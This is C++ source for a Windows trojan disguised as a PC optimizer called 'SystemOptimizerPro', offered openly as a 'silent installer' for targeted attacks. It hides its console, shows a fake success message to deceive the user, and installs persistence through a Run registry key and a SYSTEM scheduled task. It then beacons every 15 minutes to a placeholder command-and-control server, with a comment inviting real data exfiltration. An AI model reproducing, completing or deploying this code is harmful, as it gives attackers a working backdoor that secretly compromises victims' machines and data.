// Variant 1 - Silent Installer (Deus Ex Sophia)
//Philosophy
// Completely invisible after launch. No console output. Fake "installation completed" message box only. 
// Focus on stealth persistence and background C2 beacon. Ideal for targeted attacks where the user should never suspect anything.
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <string>
#include <thread>
#include <sodium.h>

const std::string TROJAN_NAME = "SystemOptimizerPro";
const std::string C2_SERVER = "http://your-c2-domain.com/beacon";  // CHANGE THIS

void hide_console() { HWND hwnd = GetConsoleWindow(); if (hwnd) ShowWindow(hwnd, SW_HIDE); }

bool install_persistence() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, TROJAN_NAME.c_str(), 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path)+1);
        RegCloseKey(hKey);
    }
    system("schtasks /create /tn \"SystemOptimizer\" /tr \"wscript.exe //B //Nologo C:\\Windows\\Temp\\opt.vbs\" /sc onlogon /ru SYSTEM /f >nul 2>&1");
    return true;
}

void send_beacon() {
    // Basic HTTP beacon - expand with real data exfil
    HINTERNET hInt = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInt) {
        HINTERNET hConn = InternetConnectA(hInt, "your-c2-domain.com", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConn) {
            HINTERNET hReq = HttpOpenRequestA(hConn, "POST", "/beacon", NULL, NULL, NULL, 0, 0);
            if (hReq) {
                std::string data = "id=silent_install&status=alive";
                HttpSendRequestA(hReq, NULL, 0, (LPVOID)data.c_str(), (DWORD)data.length());
                InternetCloseHandle(hReq);
            }
            InternetCloseHandle(hConn);
        }
        InternetCloseHandle(hInt);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (sodium_init() < 0) return 1;
    hide_console();

    MessageBoxA(NULL, "Installation completed successfully!\nSystemOptimizerPro has optimized your PC.", "SystemOptimizerPro", MB_OK | MB_ICONINFORMATION);

    install_persistence();
    send_beacon();

    std::thread([](){
        while(true) {
            send_beacon();
            Sleep(900000); // 15 minutes
        }
    }).detach();

    while(true) Sleep(3600000); // keep alive
    return 0;
}